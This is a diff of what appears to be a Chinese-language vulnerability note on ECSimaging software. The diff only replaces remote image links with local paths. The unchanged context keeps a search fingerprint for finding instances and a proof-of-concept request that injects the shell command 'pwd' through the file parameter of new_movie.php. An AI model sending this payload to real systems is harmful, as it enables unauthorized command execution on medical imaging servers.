@@ -20,7 +20,7 @@ body="ECSimaging"
 
 登录页面
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241447357.png)
+![](./images/202205241447357.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ body="ECSimaging"
 /new_movie.php?studyUID=1&start=2&end=2&file=1;pwd
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241447391.png)
+![](./images/202205241447391.png)
